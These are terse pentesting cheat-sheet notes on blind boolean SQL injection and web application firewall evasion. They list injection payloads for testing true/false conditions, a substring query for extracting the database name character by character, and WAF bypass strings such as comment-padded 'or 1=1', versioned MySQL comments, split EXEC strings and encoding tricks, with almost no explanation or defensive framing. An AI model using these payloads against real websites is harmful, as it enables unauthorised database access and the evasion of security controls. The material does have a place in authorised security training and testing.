# Blind Boolean based SQL & Evasion Techniques

## Blind Boolean based SQL

* 11' and 'N' = 'N TRUE
* 11' and 'N'= 'A False
* substring('Ahmed'.1.1)='A' => True

```
select substring(database(),1,1)='d'
```

<figure><img src="../../../../.gitbook/assets/image (140).png" alt=""><figcaption></figcaption></figure>

## Evasion Techniques

* WAF
  * ' or 1-1 --+&#x20;
    * or 2>1
    * 'or 'hacktor'>'a'
  * '/\*!<mark style="color:red;">**12345**</mark>order\*/by 7#
  * url encode,hex etc..
  * EXEC('sele','ct')
  * "UNION       SELECT"
  * '/\*\***/or/\*\*/1/\*\*/=/\*\*/1/\*\*/**
  * **Hackbar => Cyberfox**
